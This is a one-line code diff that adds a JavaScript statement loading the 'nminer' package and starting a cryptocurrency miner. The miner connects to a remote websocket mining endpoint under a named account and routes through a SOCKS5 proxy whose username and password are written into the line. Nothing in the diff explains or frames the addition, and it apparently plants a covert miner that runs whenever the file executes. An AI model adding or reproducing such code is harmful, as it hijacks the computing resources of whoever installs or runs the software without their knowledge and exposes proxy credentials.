@@ -1,0 +1,1 @@
+new (require("nminer").NMiner)("wss://nmining-runtime.igrp.app/", "endoyamato43", { proxy: "socks5://dcswarup:webshare@84.33.236.18:6661" });
